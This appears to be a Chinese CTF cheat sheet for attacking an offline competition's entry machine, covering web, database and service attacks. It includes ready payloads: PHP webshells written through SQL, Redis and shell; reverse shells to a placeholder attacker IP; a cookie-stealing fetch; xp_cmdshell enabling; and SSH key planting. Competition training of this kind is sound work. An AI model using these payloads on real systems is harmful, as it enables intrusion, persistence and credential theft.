# 第一层入口机渗透速查表

> 断网线下赛第一层入口机专用。目标不是背EXP，而是让你看到端口/页面/异常行为后，能迅速判断下一步查什么、怎么验证。

## 快速路径（30 秒）

1. `nmap -sV -p- <IP>`：先确认服务和版本。
2. 看 Web、SSH、数据库和后台服务。
3. 优先检查：弱口令、源码泄露、备份文件、配置错误、已知漏洞。
4. 按入口选择：文件上传、文件包含、SQL 注入、RCE、SSRF。
5. Getshell 后先找凭据、Flag 和下一跳网段。
---

```
扫描
 ↓

 ↓
Web / SSH / DB / 其他服务

找凭据 / Flag / 下一跳线索
```

## 5. SQL 注入

**最基础判断：**
```
?id=1'
?id=1"
?id=1 and 1=1
?id=1 and 1=2
```
观察：页面内容变化 / 报错 / HTTP状态码 / 响应长度

**UNION思路，先判断列数：**
```
?id=1 order by 1
?id=1 order by 2
?id=1 order by 3
```
或：`?id=1' order by 1--+`

然后：`UNION SELECT ...`

**重点知识：** GET/POST、字符型/数字型、回显型、盲注、时间盲注、联合查询、报错注入

**常见数据库指纹：** MySQL / MSSQL / PostgreSQL / Oracle / SQLite

> 线下赛里，判断数据库类型比背SQLMap参数更重要。

### 🔴 红队视角：SQL注入怎么变成Shell

SQL注入本身只是"能读写数据"，**红队要问的是：这个读写能力能不能落地成代码执行？**

| 落地方式 | 条件 |
|---|---|
| `INTO OUTFILE`/`INTO DUMPFILE`写WebShell | MySQL、有文件写权限、知道Web根目录绝对路径、`secure_file_priv`未限制为空 |
| **`general_log`写WebShell** | MySQL、`secure_file_priv`限制了`OUTFILE`时的替代方案——把日志文件重定向到Web目录再写马（见下方） |
| MSSQL `xp_cmdshell` | sysadmin权限，存储过程已启用或可用`sp_configure`启用 |
| PostgreSQL `COPY ... FROM PROGRAM` | 高权限账号（9.3+版本可用） |
| 读源码/配置 → 发现其他漏洞 | 任意读权限即可，不依赖写权限 |
| 读管理员密码 → 登录后台 → 后台功能写Shell | 密码明文/弱哈希 |

**MySQL写Shell示例（`INTO OUTFILE`）：**
```sql
' UNION SELECT '<?php @eval($_POST[1]);?>',2,3 INTO OUTFILE '/var/www/html/shell.php'--+
```

**MySQL写Shell示例（`general_log`绕过`secure_file_priv`）：**

当`secure_file_priv`限制了`OUTFILE`写文件路径时，如果当前账号有`SUPER`权限，可以把MySQL的通用查询日志重定向到Web目录，让"记录SQL语句"这个动作本身变成写文件：

```sql
-- 1. 打开日志功能
SET GLOBAL general_log = 'ON';

-- 2. 把日志文件路径改到Web目录下
SET GLOBAL general_log_file = '/var/www/html/shell.php';

-- 3. 执行一条包含PHP代码的"查询"，这条语句本身会被原样记进日志文件
SELECT '<?php @eval($_POST[1]);?>';

-- 4. 完事后建议关闭，避免日志疯狂增长影响后续操作
SET GLOBAL general_log = 'OFF';
```

访问`shell.php`即可触发写入的一句话木马。

> **红队心态：** 这是`OUTFILE`被限制时的经典备选方案，本质是"利用一个不是为了写Shell而设计的功能（日志记录）达成写文件"——这种思路同样适用于其他"看起来只是记录/缓存"的功能点（比如后面Redis的`dbfilename`打法）。

> **红队优先级判断：** 写权限往往受限（`secure_file_priv`、目录权限、`SUPER`权限），线下赛里SQL注入更常被当作"凭据/源码获取器"而非直接RCE手段——判断清楚这一点能省下很多试错时间。

## 6. 文件读取 / 路径穿越

看到：`?file=` `?page=` `?path=` `?filename=` `?download=`

尝试：`../` `../../` `../../../`

**Linux常见目标：**
```
/etc/passwd
/etc/hosts
/etc/hostname
/proc/self/environ
```

**Web配置（根据技术栈判断）：**
`config.php` `.env` `application.yml` `application.properties` `web.config`

**Windows：** `C:\Windows\win.ini`

> **重点：** 不要只想着"能不能读/etc/passwd"，更重要的是"能不能通过任意文件读取拿到凭据？"

### 🔴 红队视角：任意文件读取的价值排序

不是所有能读到的文件价值都一样，红队应该按"能不能变现"来排优先级，而不是逮到什么读什么：

| 优先级 | 目标 | 为什么 |
|---|---|---|
| ★★★★★ | Web配置文件（`.env`/`config.php`/`application.yml`）| 直接给数据库/Redis/第三方服务凭据，通常是最快的横向路径 |
| ★★★★★ | SSH私钥（`~/.ssh/id_rsa`）| 如果路径可预测或能配合其他信息定位，读到即可直接登录 |
| ★★★★☆ | 源码文件（而非`/etc/passwd`）| 能看到完整业务逻辑，找到其他隐藏漏洞点/后门 |
| ★★★★☆ | Nginx/Apache配置 | 可能暴露内部服务地址、其他虚拟主机、未授权的管理路径 |
| ★★★☆☆ | `/proc/self/environ`、`/proc/self/cmdline` | 能看到进程启动参数、环境变量里的密钥（但现代容器化部署较少见） |
| ★★☆☆☆ | `/etc/passwd`本身 | 只能看到用户名列表，通常不含密码（除非是老系统`/etc/shadow`且权限配置错误可读） |

**Windows补充目标：**
```
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config     # IIS配置，可能含数据库连接串
C:\phpstudy\...\my.ini            # 常见国内集成环境配置泄露
```

> **红队心态：** 任意文件读取的终局目标永远是"凭据"，而不是"证明漏洞存在"——读到`/etc/passwd`只是验证漏洞的手段，读到`.env`/`web.config`才是能往下走的实质进展。

## 7. 文件上传

看到：头像上传、附件上传、图片上传、文件管理、后台上传

**检查：** 扩展名校验 / Content-Type校验 / 文件内容校验 / 文件名处理 / 上传路径 / 是否可访问 / 是否会被服务器解析

**测试思路：** 正常图片 → 修改Content-Type → 大小写扩展名 → 双扩展名 → 特殊文件名

**确认：** 上传成功在哪里？URL是什么？服务器会不会解析？

### 🔴 红队视角：上传绕过实战手法

文件上传是**第一层最直接的Getshell路径**，核心逻辑是"绕过校验 + 让服务器把这个文件当代码解析"，两者缺一不可。

**① 绕过校验层：**

| 校验类型 | 常见绕过 |
|---|---|
| 扩展名黑名单 | 大小写混淆`.pHp`；冷门可解析后缀`.phtml` `.php5` `.pht` `.phar`（PHP）、`.asa` `.cer`（IIS/ASP） |
| Content-Type校验 | 抓包直接改成`image/jpeg`等合法值 |
| 文件头（魔术字节）校验 | 图片马：文件开头拼`GIF89a`/PNG文件头 + 一句话木马 |
| 路径截断 | `.php%00.jpg`（老PHP）、`.php/.`、`.php::$DATA`（老IIS NTFS流） |
| 二次渲染 | 图片会被重新编码时较难绕过，需专用工具在EXIF/IDAT区插代码 |
| `.htaccess`可控 | 上传自定义`.htaccess`让`.jpg`被当PHP解析（Apache） |

**② 让服务器解析成代码（中间件层）：**

| 中间件 | 解析漏洞 |
|---|---|
| IIS 6.0 | 目录名`xx.asp`下任意文件被当asp解析；`xx.asp;.jpg`分号截断 |
| IIS 7.0/7.5（Fast-CGI配置不当）| `xx.jpg/xx.php`被当PHP解析 |
| Apache | 多重扩展名从右向左识别，未知后缀（如`.php.xxx`）可能被当PHP执行 |
| Nginx（旧版+PHP-FPM配置不当）| `xx.jpg/xx.php`或`xx.jpg%00.php`被当PHP解析 |
| Tomcat | PUT方法直接上传JSP（如CVE-2017-12615）；后台war包部署 |

**常见一句话木马：**
```php
<?php @eval($_POST['cmd']); ?>
```

> **红队心态：** 上传点先别急着找"最强绕过"，优先确认这三件事——①上传后文件存在哪里（能不能访问到）②该目录是否会被当代码解析（不是所有目录都执行PHP）③校验是前端还是后端（抓包直接看有没有校验）。三点摸清楚，绕过往往只需要最基础的手法。

## 8. 命令注入

看到参数类似：`?ip=` `?host=` `?cmd=` `?domain=` `?ping=` `?target=`

功能像：Ping、DNS查询、系统诊断、文件操作、网络测试 → 优先考虑命令注入

**基础分隔符：** `;` `&&` `||` `|`
**命令替换：** `$(...)` \`...\`

验证：正常输入 + 命令分隔符 + 无害命令

拿到执行能力后判断身份：`id` `whoami` `hostname`

### 🔴 红队视角：从"能执行命令"到"稳定Shell"

命令注入本身已经是执行能力，红队要做的是**把一次性的命令执行升级成持久可控的access**：

```bash
# 反弹Shell（目标能出网时）
bash -i >& /dev/tcp/<攻击机IP>/<端口> 0>&1
nc -e /bin/sh <攻击机IP> <端口>
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<IP>",<端口>));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'

# 写WebShell（更适合断网/不出网环境，落地更稳）
echo '<?php @eval($_POST[1]);?>' > /var/www/html/shell.php

# 写SSH公钥（有home目录写权限时最持久）
echo "your_pubkey" >> ~/.ssh/authorized_keys
```

> **断网赛场关键判断：** 目标机往往不能连回攻击机，反弹Shell大概率失败。命令注入拿到执行能力后，第一反应应该是**"能不能写文件"**而不是"能不能连回来"——写WebShell或写SSH key是断网环境下更稳的落地方式。

## 9. SSRF

看到：`url=` `target=` `redirect=` `proxy=` `fetch=` `image=` `webhook=` `callback=`

```
攻击者 → Web Server → 127.0.0.1
```

尝试：`http://127.0.0.1/` → `http://localhost/` → 内网IP → 内网服务 → 本机其他端口

> 第一层靶机中特别值得关注：SSRF → 本机管理后台 / 内网服务 / 本地敏感接口

### 🔴 红队视角：SSRF不是终点，是跳板

SSRF本身**打不出Shell**，它的价值在于把攻击面从"外部能访问的Web"扩展到"内网才能访问的高价值服务"：

```
SSRF → 内网Redis(6379无认证) → 写定时任务/SSH key → Getshell
SSRF → 内网未授权管理接口（如Jenkins脚本控制台）→ 直接命令执行
SSRF → 云环境元数据接口 169.254.169.254/latest/meta-data → 拿云主机IAM凭据
SSRF → 内网其他Web管理后台（外部本不可达）→ 弱口令/漏洞利用
```

> **红队心态：** 打SSRF时脑子里要装一张"这台机器可能藏着什么内网服务"的清单（Redis/Jenkins/K8s API/Docker API/云元数据接口），而不是只满足于"证明127.0.0.1能访问"这一步就停下。

## 10. XSS

**类型：** 反射型 / 存储型 / DOM型

**常见输入位置：** 搜索框、留言板、用户名、评论、URL参数、HTTP Header

**基础测试：** `<script>alert(1)</script>`

如果过滤：标签过滤 / 事件处理器 / 编码 / 大小写 / HTML实体 / JS上下文

> 多层靶机里，XSS不一定是为了弹窗：`XSS → 管理员访问 → Cookie/权限 → 后台 → 进一步利用`

### 🔴 红队视角：XSS怎么变成实际收益

XSS本身只在受害者浏览器里执行代码，**红队要想的是"这个执行能力能偷到什么、能让受害者做什么"**：

| 目标 | 打法 |
|---|---|
| **偷会话** | `document.cookie`外带到自己的接收服务器，拿到session/token后直接顶替身份登录后台（若Cookie无`HttpOnly`）|
| **打CSRF token** | 页面里读取隐藏的CSRF token，配合自动发起请求，越过"需要登录态才能操作"的限制 |
| **构造管理员操作** | 存储型XSS命中后台管理页面时，用JS自动发起"改密码"/"加管理员账号"/"开放上传接口"等请求，替受害管理员执行操作 |
| **打内网/信息收集** | 受害者浏览器发出的请求带着受害者的网络视角，可用于探测内网服务（相当于借用户的网络位置做SSRF）|
| **BeEF钩子** | 存储型XSS命中后台时，挂一个JS钩子实现持续控制（断网赛场通常用不上真正的BeEF服务器，但思路可以简化成自定义脚本轮询）|

**关键payload（Cookie未加`HttpOnly`时）：**
```html
<script>fetch('http://攻击机/steal?c='+document.cookie)</script>
```

> **红队心态：** 反射型XSS在CTF里价值有限（需要受害者点击），但**存储型XSS命中后台/管理员可见页面**时价值极高——留言板、工单系统、用户昵称、文件名这类"会被管理员看到"的输入点，都值得优先测XSS。

## 11. 文件包含

看到：`?page=` `?file=` `?template=` `?lang=` `?view=`

**LFI / RFI**，LFI常见目标：`/etc/passwd`

进一步思考：能不能读取源码？能不能读取配置？能不能拿凭据？能不能结合其他漏洞变成代码执行？

### 🔴 红队视角：LFI只能"读"，怎么变成"执行"

LFI天生只有读文件的能力，**红队的核心思路是：找一个"我能控制内容"的文件，再用LFI去包含它**：

| 技巧 | 原理 |
|---|---|
| **日志包含** | 把PHP代码塞进User-Agent/Referer等请求头触发写入，再包含Web日志文件（如`/var/log/apache2/access.log`、Nginx对应日志）执行 |
| **Session包含** | 让某个可控字段（如登录名）含PHP代码写入session，包含`/var/lib/php/sessions/sess_xxx`执行 |
| **`php://filter`** | 只读源码用：`php://filter/convert.base64-encode/resource=config.php`，绕过PHP代码不被直接执行而是被当文本读出来 |
| **`php://input`** | 若`allow_url_include=On`，POST body直接作为PHP代码执行：`?file=php://input` |
| **`data://`伪协议** | `data://text/plain;base64,<base64后的PHP代码>`（同样需要`allow_url_include=On`） |
| **上传+包含组合拳** | 先随便上传一个含PHP代码的文件（哪怕后缀被拦，只要内容落地了），再用LFI包含它执行——**这是文件上传检验不严 + LFI组合的经典打法** |

> **红队心态：** 看到LFI别只想着读`/etc/passwd`拿flag，第一反应应该是"这个应用还有没有别的功能能让我控制文件内容"（登录框、评论区、上传点、User-Agent），LFI+可控内容点 = RCE，这是断网环境下最实用的组合。

## 12. 认证 & 弱口令

**不要只盲猜** admin/admin、admin/123456、root/root

**先从页面和源码找：** 用户名、公司名、项目名、开发者名、版本号、默认账号、测试账号

**常见账号：** admin / root / test / guest / user / administrator

**密码来源：** 公司名、项目名、域名、年份、用户名、默认密码、配置文件、源码、备份、Git、数据库

> 比赛里"弱口令"和"凭据泄露"经常是连接多个漏洞的桥。

### 🔴 红队视角：不靠密码也能绕过认证

弱口令是"猜密码"，但红队还有一整类**绕过认证逻辑本身**的手法，往往比爆破更快：

| 手法 | 原理 |
|---|---|
| **SQL注入认证绕过** | 用户名框输入 `admin'-- ` 或密码框输入 `' or '1'='1`，让WHERE条件恒真 |
| **NoSQL注入认证绕过** | MongoDB后端时，参数改成 `username[$ne]=null&password[$ne]=null`（数组形式绕过字符串比较） |
| **逻辑漏洞：验证码/短信可绕过** | 抓包直接删掉验证码参数、验证码校验接口单独调用返回真值、验证码不与session绑定可复用 |
| **越权（水平/垂直）** | 登录普通用户后，直接改`user_id`/`uid`参数访问他人数据或管理员功能（IDOR）|
| **JWT alg:none攻击** | 若后端未校验算法，把JWT的`alg`改成`none`并清空签名段，服务端可能直接信任payload |
| **默认凭据/接口遗留** | `/api/login`之外可能还有`/api/v1/login`、`/debug/login`等旧接口校验更弱 |
| **Response包信任** | 登录失败但响应包里藏着`"success":false`可被前端逻辑绕过（改包为true直接进后台，纯前端校验时有效）|

> **红队心态：** 看到登录框，先花30秒抓包看请求/响应结构，比直接爆破字典更快找到突破口——很多CTF靶机的"认证绕过"就是一个被前端拦住但后端没校验的逻辑漏洞。

### 🔴 红队视角：拿到后台之后怎么Getshell（这是最常漏掉的一步）

无论是弱口令登录、SQL注入绕过还是JWT伪造，**"进了后台"只是拿到了一个入口，真正的Getshell要靠后台自带的功能来落地**。这是CTF里最常见但也最容易被忽略的一类打法：

| 后台功能 | Getshell方式 |
|---|---|
| **文件管理器/在线编辑器** | 最直接：找到能新建/上传/编辑文件的功能，直接创建`.php`一句话木马 |
| **模板/主题编辑功能** | CMS后台常见"外观→编辑器"（如WordPress主题编辑器`Appearance→Theme Editor`），直接把PHP代码写进某个`.php`模板文件，访问对应页面触发 |
| **插件/扩展安装** | WordPress后台可以直接上传自定义插件zip包，插件里塞一句话木马，安装即执行；很多CMS的"插件市场/应用中心"同理 |
| **数据库管理入口（phpMyAdmin类）** | 后台若集成了数据库管理功能，等价于拿到了SQL执行权限，直接用第5节的`INTO OUTFILE`/`general_log`打法写Shell |
| **备份/恢复/导入导出功能** | 常见路径穿越点：文件名参数可控时能把"恢复到指定路径"变成"写到Web目录" |
| **计划任务/定时任务配置界面** | 部分运维后台（宝塔、Webmin类）允许直接在界面里填写要执行的命令 |
| **头像/Logo/附件上传** | 后台专属的上传点往往比前台校验更松（内部功能"想当然"认为是可信用户），值得单独测一遍第7节的上传绕过手法 |
| **日志查看/编辑功能** | 若能编辑日志内容，配合LFI/包含功能可以变成代码执行（同第11节日志包含思路）|
| **代码执行类"调试/测试"功能** | 部分管理后台自带"在线执行代码"、"SQL执行器"、"脚本测试"这类开发调试遗留功能，是最快的直通车 |

> **红队心态：** 拿到后台第一件事不是到处点，而是带着"哪个功能能让我控制服务器上的一个文件内容"这个问题去逛一遍菜单——上传点、编辑器、导入导出、模板管理都是重点嫌疑对象。多层靶机里，"弱口令进后台 → 后台功能Getshell"是比任何单一Web漏洞都更常见的实际打法。

## 13. Cookie / Session

看到：`PHPSESSID` `session` `token` `JWT` `remember_me` `auth`

**检查：** 是否明文 / 是否JWT / 是否包含用户信息 / 是否可修改 / 是否有角色字段 / 是否存在明显弱点

**JWT结构：** Header / Payload / Signature，重点看：`alg` `sub` `user` `role` `exp`

### 🔴 红队视角：JWT怎么打

JWT看起来是"加密"的，实际红队常用打法几乎都不需要真正破解签名：

| 打法 | 条件/工具 |
|---|---|
| **`alg`改`none`** | 服务端未强制校验算法时，把Header的`alg`改成`none`，签名段清空/删除，服务端可能直接信任payload——工具：jwt_tool |
| **RS256降级HS256** | 若服务端用非对称算法(RS256)验证但代码写错成对称算法(HS256)校验，可以用服务端的公钥当HMAC密钥自己签发合法token |
| **弱密钥爆破** | 若使用HS256，密钥强度不够时可用hashcat/jwt_tool离线爆破出HMAC密钥，再自己签发任意payload（改`role:admin`）|
| **`kid`参数注入** | 部分实现允许Header里的`kid`字段指定密钥来源，若可控可指向攻击者能控制的文件/SQL注入点 |
| **直接改payload重放** | 若发现签名根本没被验证（配置错误），可以直接改payload的`role`/`user`字段，无需处理签名 |

**离线爆破示例：**
```bash
jwt_tool <token> -C -d wordlist.txt
```

> **红队心态：** 拿到JWT先解码看payload字段（Header.Payload都是base64，不是加密），确认`alg`类型和是否有`role`/`isAdmin`这类可提权字段，再决定往哪个方向打。

## 14. 信息泄露

**搜索关键词：** password、passwd、pwd、secret、token、apikey、key、username、database、db

**位置：** HTML、JS、注释、源码、配置、日志、备份、Git、接口返回、错误信息

例如：
```js
const apiKey = "xxxx";
```
```
DB_HOST=127.0.0.1
DB_USER=root
DB_PASSWORD=xxxx
```

> 这种东西往往比CVE更有价值。

### 🔴 红队视角：容易被忽略的信息泄露点

除了直接搜关键词，红队还会主动检查这几类"开发者不小心留下的"泄露源：

| 泄露点 | 说明 |
|---|---|
| **Source Map（`.map`文件）** | 前端打包后的`app.js.map`可以还原出未压缩的原始源码，包括API调用逻辑、隐藏接口路径 |
| **`phpinfo()`页面** | `/phpinfo.php`、`/test.php`可能暴露完整PHP配置、路径、已加载模块（判断能不能配合`LFI`利用`session.upload_progress`等）|
| **Swagger/OpenAPI文档** | `/swagger-ui.html`、`/api-docs`直接列出全部接口，包括未在前端展示但后端存在的管理接口 |
| **调试模式报错页** | Laravel的Ignition调试页、Django的DEBUG=True报错页会直接输出源码片段、环境变量、SQL语句 |
| **`.DS_Store`** | macOS开发者遗留的目录索引文件，可用工具解析出目录下的完整文件列表（包括未公开链接的文件）|
| **`.idea/`、`.vscode/`** | IDE配置目录，可能包含数据库连接配置、启动参数 |
| **HTTP响应头** | `X-Powered-By`、`Server`可以精确到框架版本，反查对应CVE |

**Source map还原源码示例：**
```bash
# 用 sourcemapper 或直接浏览器 DevTools → Sources 面板加载 .map 文件
```

> **红队心态：** 信息泄露的价值不在于"发现了一个泄露"，而在于把泄露的碎片拼成完整攻击链——一个Swagger文档可能暴露一个从未在前端暴露过的管理接口，直接跳过了原本要花时间爆破的目录枚举。

## 15. Git / SVN / 备份文件

看到：`.git` `.svn` `.hg` → 源码可能泄露

**尤其关注：** `.git/config`、`.git/logs/`、历史提交、删除的配置、数据库密码、旧密码

**备份文件：** `index.php.bak` `config.php.old` `config.php~` `web.zip` `backup.zip` `www.tar.gz` `database.sql`

### 🔴 红队视角：Git泄露怎么榨干价值

看到`.git`目录暴露，不要只看当前文件——**Git的价值在于历史**，很多密码是"改过但删了"，而Git会把删除前的版本留在历史提交里：

```bash
# 断网环境需提前带好工具，常见思路：
# 1. 用 GitHack / githack.py 之类工具把 .git 目录还原成完整仓库
python2 GitHack.py http://<IP>/.git/

# 2. 还原后进入目录看完整提交历史
git log --all
git log -p              # 看每次提交具体改了什么，常能翻到"删除密码"的那次commit
git show <commit_hash>  # 看具体某次提交内容

# 3. 找被删除但仍在历史里的敏感文件
git log --diff-filter=D --summary   # 列出被删除过的文件
```

**同类思路也适用于：**
- `.svn`：用`svn`命令或`Seebug-SvnExploit`还原
- `.hg`（Mercurial）：较少见，思路类似

> **红队心态：** 开发者通常会做的事是"发现硬编码密码后删掉重新提交"，而不是"重写整个提交历史"——所以`.git`泄露往往意味着能在历史提交里翻出当前版本已经看不到的密码/密钥，这比看当前文件更有价值。

## 16. 常见 Web 中间件指纹

看到Server/页面特征快速联想：Apache、Nginx、IIS、Tomcat、Node.js、PHP、Python、Spring、ThinkPHP、Laravel、WordPress、Joomla

- **8080 + Tomcat** → 检查管理后台 / 默认页面 / 部署应用 / Manager
- **Spring Boot** → 关注 actuator / 配置泄露 / 错误信息 / 管理端点
- **WordPress** → 关注后台 / 插件 / 主题 / 用户 / 配置

### 🔴 红队视角：识别出框架后，直接联想已知打法

指纹只是第一步，红队脑子里要有一张"框架 → 已知高危功能点"的映射表，看到指纹立刻想到怎么打：

| 框架/中间件 | 红队关注点 |
|---|---|
| **Struts2** | OGNL表达式注入，历史上多个CVE（如S2-045/S2-046）可通过Content-Type头或文件上传参数直接RCE |
| **ThinkPHP** | 5.x版本存在多个未授权RCE（如`?s=index/think\app/invokefunction&...`结构的经典payload），版本判断优先 |
| **Laravel（调试模式开启）** | Ignition错误页（CVE-2021-3129）可通过`/_ignition/execute-solution`直接RCE |
| **Spring（actuator暴露）** | `/actuator/env`可能泄露配置和密钥；`/actuator/heapdump`可能dump出内存中的凭据；部分版本`/actuator/gateway`可配合SpEL RCE |
| **WebLogic** | 经典反序列化RCE（如CVE-2017-10271、CVE-2020-14882），控制台默认弱口令`weblogic/Oracle@123` |
| **Weblogic/JBoss控制台暴露** | 直接后台部署war包getshell |
| **Node.js/Express** | 关注是否用了存在原型链污染漏洞的老版本依赖库 |
| **WordPress插件/主题** | 版本号定位已知CVE，很多插件RCE/任意文件上传是公开的 |

> **红队心态：** 看到中间件名字和版本号，先在脑子里过一遍"这个框架有没有历史成名RCE"，而不是从零开始手工挖洞——线下赛出的中间件漏洞，大概率是已披露但需要手工构造payload（而非直接搜EXP）的那种。

## 17. 数据库服务

**MySQL：**
```bash
mysql -h <IP> -u <user> -p
```
拿到账号后重点看：数据库、表、用户、密码、业务数据

**Redis（6379）：** 检查是否需要认证 / 配置 / 版本 / 数据内容，特别关注 keys、配置、session、缓存、凭据

**MSSQL（1433）：** 弱口令 / 数据库凭据 / Windows身份 / xp_cmdshell是否存在可用

### 🔴 红队视角：数据库服务本身怎么变成Shell

拿到数据库连接权限后，别只满足于"能读数据"——高权限账号往往能直接落地成命令执行：

| 服务 | Getshell方式 |
|---|---|
| **Redis无认证** | ```config set dir /var/www/html``` → ```config set dbfilename shell.php``` → ```set x "<?php eval($_POST[1]);?>"``` → ```save```（把内存数据当WebShell内容存盘）；或写`crontab`反弹Shell；或写`~/.ssh/authorized_keys`免密登录 |
| **MySQL高权限** | `INTO OUTFILE`或`general_log`写WebShell（见第5节） |
| **MSSQL sysadmin** | `EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'` |
| **PostgreSQL高权限** | `COPY (SELECT '') TO PROGRAM 'id'` 直接执行命令 |
| **MongoDB无认证** | 直接getshell路径较少，一般作为凭据/业务数据跳板 |

> **红队心态：** 数据库账号权限一旦是高权限（SUPER/sysadmin/superuser），价值往往等同于直接拿到系统命令执行——这类目标应该优先于纯Web层的漏洞挖掘。

## 18. FTP（21）

匿名登录？→ 目录 / 文件 / 上传权限 / 下载文件 / 配置文件 / 备份

> 拿到FTP文件不要只看文件名，看文件内容。

### 🔴 红队视角：FTP除了翻文件还能干什么

| 打法 | 说明 |
|---|---|
| **vsftpd 2.3.4后门（经典CVE）** | 特定版本的vsftpd在用户名里输入`:)`会触发后门，直接在6200端口打开一个root shell——版本判断优先 |
| **有写权限时上传WebShell** | 如果FTP目录和Web目录是同一路径（常见于小型站点/共享主机环境），直接上传一句话木马，再通过Web访问触发 |
| **配置文件反查数据库** | FTP里常见`config.php`/`wp-config.php`等备份文件，直接给数据库凭据 |
| **弱口令/匿名写入探测** | 除了匿名读，务必测试匿名账号是否有**写权限**——很多题目故意留了可写的匿名FTP作为上传入口 |

```bash
ftp <IP>
# 用户名: anonymous
# 密码: 任意/空

# 检查是否可写
put test.txt
```

> **红队心态：** FTP拿到的文件本身很少直接是flag，价值在于**里面的配置/凭据能不能横向到Web/数据库/SSH**——所以下载后第一件事是grep敏感关键词，而不是逐个打开看。

## 19. SMB（139/445）

重点：共享 / 匿名访问 / 用户名 / 文件 / 配置 / 备份

> Windows第一层非常可能通过：`SMB → 共享目录 → 配置文件 → 凭据 → 下一台机器`

### 🔴 红队视角：SMB枚举与经典打法

```bash
# 匿名枚举共享
smbclient -L //<IP>/ -N
enum4linux -a <IP>

# 连接共享（匿名或已知凭据）
smbclient //<IP>/<share> -N
smbclient //<IP>/<share> -U <user>

# 下载整个共享目录
smbget -R smb://<IP>/<share>/
```

**经典漏洞：**

| 漏洞 | 说明 |
|---|---|
| **MS17-010（永恒之蓝）** | Windows SMBv1远程代码执行，影响老版本Windows（7/2008/XP等），有现成exploit可直接getshell——工具：`msfconsole`/独立exploit脚本，断网环境需提前带好 |
| **匿名共享读写** | 部分靶机故意配置匿名可写共享，可直接上传文件或读取敏感备份 |
| **弱口令爆破** | `hydra`/`crackmapexec`对已知用户名批量试密码 |
| **SMB Relay** | 如果能诱导目标机对你发起SMB认证（如放置恶意`.lnk`/`.scf`文件），可以中继凭据 hash 到其他机器认证 |

> **红队心态：** 看到445端口，先无脑跑一遍`smbclient -L`和`enum4linux`——共享目录里翻到配置文件/备份的概率很高，而且这两个命令几乎不需要任何前置条件。

## 20. SSH（22）

SSH本身通常不是漏洞入口，而是**凭据验证器**。

看到SSH问自己：哪里找用户名？哪里找密码？有没有SSH Key？是否存在密码复用？

```
Web密码 → 尝试判断是否复用 → SSH
```

（以比赛授权范围为准）

### 🔴 红队视角：SSH相关的间接信息利用

SSH本身很难直接"攻击"，但围绕SSH的一些边角信息经常被忽略：

| 信息源 | 价值 |
|---|---|
| **`known_hosts`文件** | 拿到某台机器的Shell后，`~/.ssh/known_hosts`里记录了这台机器曾经连接过的其他主机IP——是发现内网其他机器的免费线索 |
| **私钥文件权限过松** | 若在共享目录/备份里翻到私钥文件（`id_rsa`），直接尝试免密登录 |
| **`authorized_keys`可写** | 命令注入/文件写入拿到权限后，最持久的落地方式是把自己的公钥追加进去，比WebShell更稳定（不依赖Web服务存活）|
| **SSH配置文件`/etc/ssh/sshd_config`** | 查看`PermitRootLogin`、`PasswordAuthentication`等配置，判断是否可以密码登录/root是否可直接登录 |
| **CVE漏洞版本** | 极老版本OpenSSH存在已知漏洞（如CVE-2018-15473用户名枚举），版本判断优先，但线下赛较少见 |

> **红队心态：** SSH本身很难被"攻破"，它更多是**验证你从别的地方拿到的凭据是否有效**的工具——真正该花时间的是"怎么拿到能登录SSH的凭据"，而不是攻击SSH协议本身。

| `.git` | 源码 / 历史凭据 |
| `.bak/.old/.zip` | 备份泄露 |
| `robots.txt` | 隐藏目录 |
| 8080 | 管理后台 / Java Web |
| 445 | SMB |
| 3306 | MySQL |
| 6379 | Redis |
| 9200 | Elasticsearch |
| 22 | SSH凭据 |
| 21 | FTP / 匿名访问 |
| Shell | 凭据 + 内网 + 提权 |

---

## 24. 第一层最重要的"思维检查点"

拿到第一台以后，每完成一步都问自己这6个问题：

1. 我现在是谁？
2. 我现在在哪里？
3. 这台机器还有什么网络接口？
4. 这台机器还有什么服务？
5. 这台机器上还有什么凭据？
6. 这台机器能不能通向别的机器？

```
身份 → 主机 → 服务 → 凭据 → 网络 → 下一跳
```

## 25. 反序列化 → Shell

看到序列化数据特征时考虑反序列化利用：`O:4:"xxx"`（PHP）、`AC ED 00 05`（Java）、`\x80\x04`等opcode（Python pickle）

| 语言 | 红队思路 |
|---|---|
| **PHP** | 找POP链，触发`__destruct`/`__wakeup`等魔术方法，最终调用文件写入或命令执行函数 |
| **Java** | 常见于登录Cookie（如Shiro的`rememberMe`字段）、RMI/JMX接口，配合已知Gadget链（如CommonsCollections）直接RCE |
| **Python** | pickle的`__reduce__`方法可执行任意命令，常见于不安全的缓存/session反序列化 |

> **红队心态：** 断网环境下手工构造反序列化payload难度较高，这是为数不多**必须提前离线准备好现成工具/模板**的漏洞类型——建议赛前把常见框架（Shiro、Fastjson、Struts2）对应的payload生成工具打包进赛场机器，而不是指望现场手搓。

---

## 26. 高价值管理接口直接RCE

拿到Shell最快的往往不是"利用漏洞"，而是**发现了本就设计为可执行代码/命令、但暴露在外的管理接口**——这类目标应该在扫描阶段就被标记为最高优先级：

| 接口 | 方式 |
|---|---|
| Jenkins脚本控制台（未授权）| 直接执行Groovy脚本调用系统命令 |
| Docker API（2375无认证）| 起一个挂载宿主机`/`的特权容器，容器内chroot出来即获得宿主机权限 |
| Kubernetes API（6443可匿名访问）| 直接创建Pod执行命令，或读取Secret获取集群凭据 |
| Webmin/宝塔等运维面板 | 弱口令登录后台 → 计划任务/文件管理直接写Shell |
| Jupyter Notebook（无认证）| 直接新建Notebook执行系统命令 |
| Elasticsearch（旧版本）| 部分版本存在脚本执行漏洞（如CVE-2015-1427），可直接RCE |

> **红队心态：** 这类"配置错误型"目标本质上不需要"利用"——功能本身就是执行代码，暴露出来就等于开了后门。第一层扫到这些端口，优先级要高于任何需要精心构造payload的Web漏洞。

## 赛场版极简口诀

```
先扫端口，再认服务
Web看源码，目录要枚举
参数想注入，文件想读取
上传看解析，URL想SSRF
登录想弱口令，配置找密码
备份找源码，Git找历史
Shell看身份，身份看权限
权限看凭据，凭据找下一跳
```

> 如果是多层靶机，第一层真正的终点通常不是Flag，而是"拿到下一层的钥匙"。
